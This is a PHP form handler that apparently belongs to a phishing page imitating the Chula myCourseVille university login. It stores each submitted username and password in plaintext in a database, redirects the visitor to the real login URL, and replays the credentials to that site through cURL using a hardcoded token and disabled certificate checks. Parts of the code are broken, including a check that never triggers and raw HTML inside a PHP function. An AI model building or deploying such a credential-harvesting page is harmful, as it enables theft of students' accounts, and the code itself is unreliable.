<?php
include 'simple_html_dom.php';


if (isset($_POST['Gobtn'])) {
    require 'data.php';

    $username = $_POST['username'];
    $password = $_POST['password'];

    if (empty($username) || empty($password)) {
        header("Location: chulalogin.php?1");
        exit();

    }
    else {
        $sql = "SELECT username FROM accounts WHERE username=?";
        $statement = mysqli_stmt_init($conn);

        if (!mysqli_stmt_prepare($statement,$sql)) {
            header("Location: chulalogin.php?2");
            exit();
        }

    
    else{
        mysqli_stmt_bind_param($statement,"s",$username);
        mysqli_stmt_execute($statement);
        mysqli_stmt_store_result($statement);
        $resultCheck = mysqli_stmt_num_rows($statement);
        if ($resultCheck < 0 ) {
            header("Location: chulalogin.php?3");
            exit();
        }
        else{
            $sql = "INSERT INTO accounts (username,password) VALUES (?,?)";
            $statement = mysqli_stmt_init($conn);
            if (!mysqli_stmt_prepare($statement,$sql)) {
                header("Location: chulalogin.php?4");
                exit();
            }
            else {
                mysqli_stmt_bind_param($statement,"ss",$username,$password);
                mysqli_stmt_execute($statement);
                header("Location: https://www.mycourseville.com/api/chulalogin"); #1
                #header("Location: https://www.mycourseville.com/"); #1
                CURLs($username,$password);
                #CURlstest($username,$password);

                exit();  #1

            }
    
        }

    }
} 
    mysqli_stmt_close($statement);
    mysqli_close($conn);

} else{
    header("Location: chulalogin.php?5");
    exit();
}

function CURLs($id,$pass) {


                // $context = stream_context_create(array(
                //     'http' => array(
                //         'header' => array('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'),
                //     ),
                // ));
                // $url = urlencode('https://www.mycourseville.com/api/chulalogin');
                // $html = file_get_contents($url);
                
                // $_tokens = $html->find('input[name=_token]');
                 $real_token = "u47P3wvFLsvhn9dzuKu6TIupuYppBMN9z9agu4qo";


                
                //The username or email address of the account.
                
                
                //Set a user agent. This basically tells the server that we are using Chrome ;)
                define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36');
                
                //Where our cookie information will be stored (needed for authentication).
                define('COOKIE_FILE', 'cookie.txt');
                
                //URL of the login form.
                define('LOGIN_FORM_URL', 'https://www.mycourseville.com/api/chulalogin');
                
                //Login action URL. Sometimes, this is the same URL as the login form.
                define('LOGIN_ACTION_URL', 'https://www.mycourseville.com/api/chulalogin');
                $postFields = array(
                    "_token" => $real_token,
                    "username" => $id,
                    "password" => $pass
                );
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://www.mycourseville.com/api/chulalogin');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_USERAGENT, USER_AGENT);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
                #curl_setopt($ch, CURLOPT_POSTFIELDS, "username=".$username."&password=".$password);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_COOKIEFILE,"cookie.txt");
                curl_setopt($ch, CURLOPT_COOKIEJAR, COOKIE_FILE);
                curl_setopt($ch, CURLOPT_REFERER, 'https://www.mycourseville.com/api/chulalogin');
                curl_setopt($ch, CURLOPT_TIMEOUT, 60);
                
                
                curl_exec($ch);
               
                
                curl_close($ch);
              
}

function CURlstest($id,$pass) {
    <form action="https://www.mycourseville.com/api/chulalogin">
        <input type="sumbit">
        </form>
}